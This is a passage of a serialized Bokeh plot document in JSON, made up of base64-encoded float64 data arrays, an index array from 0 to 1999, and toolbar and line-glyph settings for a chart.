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","dtype":"float64","shape":[2000]}},"selected":{"id":"1161","type":"Selection"},"selection_policy":{"id":"1162","type":"UnionRenderers"}},"id":"1136","type":"ColumnDataSource"},{"attributes":{"callback":null},"id":"1103","type":"DataRange1d"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1121","type":"PanTool"},{"id":"1122","type":"WheelZoomTool"},{"id":"1123","type":"BoxZoomTool"},{"id":"1124","type":"SaveTool"},{"id":"1125","type":"ResetTool"},{"id":"1126","type":"HelpTool"},{"id":"1134","type":"CrosshairTool"}]},"id":"1127","type":"Toolbar"},{"attributes":{},"id":"1122","type":"WheelZoomTool"},{"attributes":{},"id":"1121","type":"PanTool"},{"attributes":{"overlay":{"id":"1165","type":"BoxAnnotation"}},"id":"1123","type":"BoxZoomTool"},{"attributes":{},"id":"1125","type":"ResetTool"},{"attributes":{},"id":"1124","type":"SaveTool"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1143","type":"Line"},{"attributes":{"source":{"id":"1141","type":"ColumnDataSource"}},"id":"1145","type":"CDSView"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,1232,1233,1234,1235,1236,1237,1238,1239,1240,1241,1242,1243,1244,1245,1246,1247,1248,1249,1250,1251,1252,1253,1254,1255,1256,1257,1258,1259,1260,1261,1262,1263,1264,1265,1266,1267,1268,1269,1270,1271,1272,1273,1274,1275,1276,1277,1278,1279,1280,1281,1282,1283,1284,1285,1286,1287,1288,1289,1290,1291,1292,1293,1294,1295,1296,1297,1298,1299,1300,1301,1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1312,1313,1314,1315,1316,1317,1318,1319,1320,1321,1322,1323,1324,1325,1326,1327,1328,1329,1330,1331,1332,1333,1334,1335,1336,1337,1338,1339,1340,1341,1342,1343,1344,1345,1346,1347,1348,1349,1350,1351,1352,1353,1354,1355,1356,1357,1358,1359,1360,1361,1362,1363,1364,1365,1366,1367,1368,1369,1370,1371,1372,1373,1374,1375,1376,1377,1378,1379,1380,1381,1382,1383,1384,1385,1386,1387,1388,1389,1390,1391,1392,1393,1394,1395,1396,1397,1398,1399,1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1412,1413,1414,1415,1416,1417,1418,1419,1420,1421,1422,1423,1424,1425,1426,1427,1428,1429,1430,1431,1432,1433,1434,1435,1436,1437,1438,1439,1440,1441,1442,1443,1444,1445,1446,1447,1448,1449,1450,1451,1452,1453,1454,1455,1456,1457,1458,1459,1460,1461,1462,1463,1464,1465,1466,1467,1468,1469,1470,1471,1472,1473,1474,1475,1476,1477,1478,1479,1480,1481,1482,1483,1484,1485,1486,1487,1488,1489,1490,1491,1492,1493,1494,1495,1496,1497,1498,1499,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510,1511,1512,1513,1514,1515,1516,1517,1518,1519,1520,1521,1522,1523,1524,1525,1526,1527,1528,1529,1530,1531,1532,1533,1534,1535,1536,1537,1538,1539,1540,1541,1542,1543,1544,1545,1546,1547,1548,1549,1550,1551,1552,1553,1554,1555,1556,1557,1558,1559,1560,1561,1562,1563,1564,1565,1566,1567,1568,1569,1570,1571,1572,1573,1574,1575,1576,1577,1578,1579,1580,1581,1582,1583,1584,1585,1586,1587,1588,1589,1590,1591,1592,1593,1594,1595,1596,1597,1598,1599,1600,1601,1602,1603,1604,1605,1606,1607,1608,1609,1610,1611,1612,1613,1614,1615,1616,1617,1618,1619,1620,1621,1622,1623,1624,1625,1626,1627,1628,1629,1630,1631,1632,1633,1634,1635,1636,1637,1638,1639,1640,1641,1642,1643,1644,1645,1646,1647,1648,1649,1650,1651,1652,1653,1654,1655,1656,1657,1658,1659,1660,1661,1662,1663,1664,1665,1666,1667,1668,1669,1670,1671,1672,1673,1674,1675,1676,1677,1678,1679,1680,1681,1682,1683,1684,1685,1686,1687,1688,1689,1690,1691,1692,1693,1694,1695,1696,1697,1698,1699,1700,1701,1702,1703,1704,1705,1706,1707,1708,1709,1710,1711,1712,1713,1714,1715,1716,1717,1718,1719,1720,1721,1722,1723,1724,1725,1726,1727,1728,1729,1730,1731,1732,1733,1734,1735,1736,1737,1738,1739,1740,1741,1742,1743,1744,1745,1746,1747,1748,1749,1750,1751,1752,1753,1754,1755,1756,1757,1758,1759,1760,1761,1762,1763,1764,1765,1766,1767,1768,1769,1770,1771,1772,1773,1774,1775,1776,1777,1778,1779,1780,1781,1782,1783,1784,1785,1786,1787,1788,1789,1790,1791,1792,1793,1794,1795,1796,1797,1798,1799,1800,1801,1802,1803,1804,1805,1806,1807,1808,1809,1810,1811,1812,1813,1814,1815,1816,1817,1818,1819,1820,1821,1822,1823,1824,1825,1826,1827,1828,1829,1830,1831,1832,1833,1834,1835,1836,1837,1838,1839,1840,1841,1842,1843,1844,1845,1846,1847,1848,1849,1850,1851,1852,1853,1854,1855,1856,1857,1858,1859,1860,1861,1862,1863,1864,1865,1866,1867,1868,1869,1870,1871,1872,1873,1874,1875,1876,1877,1878,1879,1880,1881,1882,1883,1884,1885,1886,1887,1888,1889,1890,1891,1892,1893,1894,1895,1896,1897,1898,1899,1900,1901,1902,1903,1904,1905,1906,1907,1908,1909,1910,1911,1912,1913,1914,1915,1916,1917,1918,1919,1920,1921,1922,1923,1924,1925,1926,1927,1928,1929,1930,1931,1932,1933,1934,1935,1936,1937,1938,1939,1940,1941,1942,1943,1944,1945,1946,1947,1948,1949,1950,1951,1952,1953,1954,1955,1956,1957,1958,1959,1960,1961,1962,1963,1964,1965,1966,1967,1968,1969,1970,1971,1972,1973,1974,1975,1976,1977,1978,1979,1980,1981,1982,1983,1984,1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999],"y":{"__ndarray__":"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